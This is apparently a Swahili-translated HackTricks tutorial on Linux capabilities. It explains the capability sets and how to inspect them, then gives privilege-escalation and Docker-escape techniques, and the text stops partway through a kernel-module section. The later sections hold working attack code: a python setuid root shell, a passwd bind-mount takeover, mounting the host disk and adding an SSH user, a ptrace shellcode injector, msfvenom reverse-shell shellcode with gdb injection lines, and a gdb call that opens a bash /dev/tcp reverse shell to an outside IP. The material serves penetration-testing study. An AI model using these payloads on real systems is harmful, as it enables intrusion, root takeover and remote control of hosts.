# Uwezo wa Linux

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities hugawanya **root privileges katika vitengo vidogo na tofauti**, hivyo kuruhusu processes kuwa na subset ya privileges. Hii hupunguza risks kwa kutotoa root privileges kamili bila sababu.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Tatizo:

- Normal users wana permissions chache kwa operations kama kufungua raw sockets au ku-bind Internet ports zilizo chini ya 1024; capabilities zinaweza kutoa operation inayohitajika pekee badala ya root privilege kamili.<sup>[[14]](#references)</sup>

### Sets za Capabilities:

Linux huonyesha sets hizi za capabilities kwa kila thread, na kernel hutumia constraints zake wakati process inabadilisha credentials au inatekeleza file.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Purpose**: Hutambua capabilities zinazoweza kuchangia kwenye permitted set baada ya `execve()` wakati file inayotekelezwa ina file capabilities za inheritable zinazolingana.
- **Functionality**: Inheritable set ya thread huhifadhiwa kupitia `execve()`; yenyewe haiwezeshi capabilities hizo.
- **Restrictions**: Kuongeza capability kwenye set hii kunazuiwa na permitted na bounding sets.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Purpose**: Inawakilisha capabilities halisi ambazo process inatumia wakati wowote.
- **Functionality**: Ni set ya capabilities ambazo kernel hukagua ili kutoa permission kwa operations mbalimbali. Kwa files, set hii inaweza kuwa flag inayoonyesha ikiwa permitted capabilities za file zinapaswa kuchukuliwa kuwa effective.
- **Significance**: Effective set ni muhimu kwa ukaguzi wa privileges wa papo hapo, ikiwa kama set hai ya capabilities ambazo process inaweza kutumia.

3. **Permitted (CapPrm)**:

- **Purpose**: Hufafanua set ya juu zaidi ya capabilities ambazo process inaweza kuwa nazo.
- **Functionality**: Process inaweza kuhamisha capability kutoka permitted set hadi effective set, na hivyo kupata uwezo wa kutumia capability hiyo. Pia inaweza kuondoa capabilities kutoka permitted set yake.
- **Boundary**: Ikiwa capability imeondolewa kwenye set hii, kwa kawaida haiwezi kurejeshwa bila kutekeleza file inayotoa capability hiyo au privileged transition nyingine.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Purpose**: Huweka kikomo kwa capabilities ambazo process inaweza kupata kutoka kwa file wakati wa `execve()` na zile ambazo inaweza kuongeza kwenye inheritable set yake.
- **Functionality**: Set hii hurithiwa kupitia `fork()` na huhifadhiwa kupitia `execve()`; capabilities zinaweza kuondolewa humo wakati caller ana `CAP_SETPCAP`.
- **Use-case**: Kuondoa capabilities zisizohitajika kutoka kwenye set hii hupunguza upatikanaji wa privileges baadaye.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Purpose**: Huruhusu capabilities zilizochaguliwa kubaki permitted na effective wakati wa `execve()` ya program isiyo na privileges.
- **Functionality**: Ambient capabilities huongezwa kwenye permitted na effective sets mpya wakati file inayotekelezwa haina privileges.
- **Restrictions**: Capability inaweza kuwa ambient ikiwa tu ipo katika permitted na inheritable sets zote mbili; kutekeleza set-user-ID/set-group-ID file au file iliyo na capabilities huondoa ambient set.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities za Processes na Binaries

### Capabilities za Processes

Ili kuona capabilities za process fulani, tumia file ya **status** katika directory ya /proc. Kwa kuwa inatoa maelezo zaidi, tuyapunguze yabaki tu kwenye taarifa zinazohusiana na Linux capabilities.\
Kumbuka kuwa kwa processes zote zinazoendelea, taarifa za capabilities huhifadhiwa kwa kila thread, huku file capabilities zikihifadhiwa katika extended attributes za `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Unaweza kupata capabilities zilizofafanuliwa katika /usr/include/linux/capability.h

Unaweza kupata capabilities za process ya sasa kwa `cat /proc/self/status` au kwa `capsh --print`, na za processes nyingine katika `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Amri hii inapaswa kurudisha mistari mitano ya capabilities kwenye mifumo mingi.<sup>[[15]](#references)</sup>

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Nambari hizi za hexadecimal hazina maana. Kwa kutumia utility ya `capsh`, tunaweza kuzifafanua kuwa majina ya capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Hebu sasa tuchunguze **capabilities** zinazotumiwa na `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Ingawa hiyo inafanya kazi, kuna njia nyingine na rahisi zaidi. Ili kuona capabilities za process inayoendesha, tumia tool ya **getpcaps** ikifuatiwa na process ID (PID) yake; pia inakubali orodha ya process IDs.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Hebu tuangalie capabilities za `tcpdump` baada ya kuipa binary hiyo `cap_net_admin` na `cap_net_raw` ili kunusa mtandao (`tcpdump` inaendesha katika process 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Kama unavyoona, capabilities zinaendana na matokeo ya njia hizo mbili za kuchunguza process. Tool ya `getpcaps` hutumia libcap kuuliza capabilities za process lengwa na kuzichapisha katika mfumo wa maandishi; inakubali PID moja au zaidi.<sup>[[22]](#references)</sup>

### Capabilities za Binaries

Binaries zinaweza kuwa na file capabilities zinazotumika wakati wa execution. Kwa mfano, binary ya `ping` inaweza kuwa na capability ya `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Unaweza **kutafuta binaries zenye capabilities** kwa kutumia `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Kuondoa capabilities kwa kutumia capsh

Ikiwa tutaondoa `CAP_NET_RAW` kutoka kwenye bounding set inayotumika, program inayohitaji capability hiyo haipaswi tena kuwa na uwezo wa kuitumia.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Mbali na matokeo ya _capsh_ yenyewe, amri ya _tcpdump_ yenyewe pia inapaswa kutoa hitilafu.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Hitilafu inaonyesha kuwa `tcpdump` haiwezi kutekelezwa kwa file capability iliyoombwa baada ya `CAP_NET_RAW` kuondolewa kwenye bounding set.

### Ondoa Capabilities

Unaweza kuondoa capabilities za file kwa kutumia `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## Uwezo wa Mtumiaji

Linux haiwapi watumiaji wa kuingia capabilities za faili moja kwa moja, lakini PAM module `pam_cap` inaweza kuweka capabilities za kurithishwa kwa vipindi vilivyoidhinishwa kwa kutumia `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Kila ingizo huunganisha majina au nambari za capability zilizotenganishwa kwa koma na jina moja au zaidi la watumiaji.<sup>[[17]](#references)</sup>
Mfano wa faili:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capabilities za Mazingira

Kukompile programu ifuatayo huwezesha **kuanzisha bash shell ndani ya mazingira yanayotoa capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Ndani ya **bash inayotekelezwa na ambient binary iliyocompile**, inawezekana kuona **capabilities mpya** (mtumiaji wa kawaida hatakuwa na capability yoyote katika sehemu ya "current").<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> **Unaweza tu kuongeza capabilities zilizopo** katika seti za permitted na inheritable.<sup>[[14]](#references)</sup>

### Binaries zinazotambua capabilities/Binaries zisizotambua capabilities

Binary isiyotambua capabilities ni program yenye file capabilities ambayo haitumii libcap kuzidhibiti. Ikiwa file effective bit yake imewekwa, kernel huwezesha file permitted capabilities katika effective set ya process; execution inaweza kushindwa ikiwa process haikupata permitted capabilities zote.<sup>[[14]](#references)</sup>

## Capabilities za Service

System service inayoendesha kama root inaweza kuhifadhi capabilities pana isipokuwa execution environment yake izuie capabilities hizo. Katika systemd unit, `User=` huchagua mtumiaji wa service, na `AmbientCapabilities=` huongeza capabilities zilizotajwa kwenye ambient set ya process inayotekelezwa.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities katika Docker Containers

Docker huanzisha containers zikiwa na seti ya capabilities za msingi inayoweza kubadilishwa kwa `--cap-add` na `--cap-drop`; container ya mfano inaweza kukaguliwa kwa `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities ni muhimu wakati **unapotaka kuzuia processes zako mwenyewe baada ya kutekeleza privileged operations** (kwa mfano, baada ya kusanidi chroot na ku-bind kwenye socket). Hata hivyo, zinaweza kutumiwa vibaya kwa kuzipitishia commands au arguments hasidi ambazo baadaye huendeshwa kama root.<sup>[[2]](#references)</sup>

Unaweza kulazimisha file capabilities ziwekwe kwenye programs kwa kutumia `setcap`, na kuzi-query kwa kutumia `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Katika maandishi ya file-capability, `+ep` huinua capability iliyotajwa katika effective na permitted sets; `-` hushusha flags zilizochaguliwa.<sup>[[21]](#references)</sup>

Ili kutambua programu zilizo kwenye mfumo au folder zenye capabilities, tumia `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Mfano wa exploitation

Katika mfano ufuatao, binary `/usr/bin/python2.6` inapatikana kuwa vulnerable kwa privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** zinazohitajika na `tcpdump` ili **kuruhusu mtumiaji yeyote kufanya sniffing ya packets**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Hali maalum ya capabilities "tupu"

Faili inaweza kuwa na seti tupu ya capability (`getcap myelf` inarudisha `myelf =ep`). Seti tupu haitoi capabilities; inapounganishwa na root-owned set-user-ID bit, program bado inaweza kubadilisha executing process's effective na saved IDs kuwa 0 bila kupata file capabilities. Faili isiyo na owner, isiyo na SUID/SGID, yenye `=ep` haiendeshwi kama root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ni Linux capability yenye nguvu sana, ambayo mara nyingi hulinganishwa na kiwango cha karibu na root kutokana na **administrative privileges** zake nyingi, kama vile ku-mount devices au kudhibiti kernel features. Ingawa ni muhimu kwa containers zinazoiga systems nzima, **`CAP_SYS_ADMIN` inaleta changamoto kubwa za usalama**, hasa katika mazingira ya containerized, kutokana na uwezekano wake wa privilege escalation na system compromise. Kwa hiyo, matumizi yake yanahitaji security assessments kali na usimamizi wa tahadhari, huku ikipendekezwa sana kuondoa capability hii katika application-specific containers ili kuzingatia **principle of least privilege** na kupunguza attack surface.<sup>[[14]](#references)</sup>

**Mfano wenye binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Kwa kutumia Python, unaweza ku-mount faili ya _passwd_ iliyorekebishwa juu ya faili halisi ya _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Na mwishowe **mount** faili ya `passwd` lililorekebishwa kwenye `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Na utaweza kufanya **`su` kama root** ukitumia nenosiri "password".

**Mfano wenye environment (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya docker container ukitumia:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Katika matokeo ya awali unaweza kuona kwamba capability ya SYS_ADMIN imewezeshwa.<sup>[[14]](#references)</sup>

- **Mount**

Kwa ufikiaji unaofaa wa kifaa na namespace, hii inaweza kuruhusu Docker container **ku-mount disk ya host na kufikia yaliyomo**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Ufikiaji kamili**

Katika mbinu iliyotangulia tuliweza kufikia diski ya host.\
Ikiwa host inaendesha server ya **ssh**, unaweza **kuunda mtumiaji ndani ya diski iliyowekwa (mounted)** na kuifikia kupitia SSH.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Kwa `CAP_SYS_PTRACE`, process inaweza kufuatilia na kukagua processes nyingine zinazoonekana katika PID namespace yake. Ili kulenga host processes kutoka kwenye Docker container, share host PID namespace kwa kutumia `--pid=host` (au jiunge na namespace iliyo na target).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** hutoa uwezo wa kutumia debugging na system call tracing functionalities zinazotolewa na `ptrace(2)` pamoja na cross-memory attach calls kama `process_vm_readv(2)` na `process_vm_writev(2)`. Ingawa ina nguvu kwa madhumuni ya diagnostics na monitoring, ikiwa `CAP_SYS_PTRACE` imewezeshwa bila hatua za kuizuia, kama seccomp filter kwenye `ptrace(2)`, inaweza kudhoofisha kwa kiasi kikubwa usalama wa mfumo. Hasa, inaweza kutumiwa kukwepa security restrictions nyingine, hususan zile zilizowekwa na seccomp, kama inavyoonyeshwa na [proofs of concept (PoC) kama huu](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Mfano wenye binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Mfano wa binary (gdb)**

`gdb` yenye capability ya `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Tengeneza shellcode kwa kutumia msfvenom ili kuiingiza kwenye memory kupitia gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debug mchakato wa root kwa kutumia gdb na unakili na kubandika mistari ya gdb iliyozalishwa awali:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Mfano wenye mazingira (Docker breakout) - Another gdb Abuse**

Ikiwa **GDB** imesakinishwa (au unaweza kuisakinisha kwa `apk add gdb` au `apt install gdb`, kwa mfano) unaweza **debug mchakato kutoka kwa host** na kuufanya uite function ya `system`. (Mbinu hii pia inahitaji capability ya `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Hutaweza kuona matokeo ya command iliyotekelezwa, lakini itaendeshwa na process hiyo (kwa hivyo pata rev shell).

> [!WARNING]
> Ukipata error "No symbol "system" in current context.", angalia mfano uliotangulia wa kupakia shellcode kwenye programu kupitia gdb.

**Mfano wa environment (Docker breakout) - Shellcode Injection**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya docker container ukitumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Orodhesha **processes** zinazoendeshwa kwenye **host** `ps -eaf`

1. Pata **architecture** `uname -m`
2. Tafuta **shellcode** ya architecture hiyo ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Tafuta **program** ya **inject** **shellcode** kwenye memory ya process ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** **shellcode** ndani ya program na **compile** yake `gcc inject.c -o inject`
5. **Inject** na upate **shell** yako: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** huwezesha process **kupakia na kuondoa kernel modules (`init_module(2)`, `finit_module(2)` na `delete_module(2)` system calls)**, hivyo kutoa ufikiaji wa moja kwa moja wa core operations za kernel. Capability hii inaleta security risks muhimu kwa sababu kupakia module kunaweza kubadilisha tabia ya kernel na kunaweza kuvunja isolation boundaries.<sup>[[6]](#references)[[14]](#references)</sup>
**Hii inaruhusu kuingiza au kuondoa modules kwenye kernel inayoonekana kwa process; kwenye container, ikiwa ni host kernel hutegemea isolation configuration**.<sup>[[14]](#references)</sup>

**Mfano wa binary**

Katika mfano unaofuata, binary **`python`** ina capability hii.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Kwa chaguo-msingi, amri ya **`modprobe`** hukagua orodha ya dependencies na faili za map katika saraka **`/lib/modules/$(uname -r)`**.\
Ili kutumia hii vibaya, hebu tuunde folda bandia ya **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Kisha **compile kernel module unayoweza kupata katika mifano 2 hapa chini na uinakili** kwenye folder hii:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Hatimaye, tekeleza code ya Python inayohitajika ili kupakia kernel module hii:
```python
import kmod
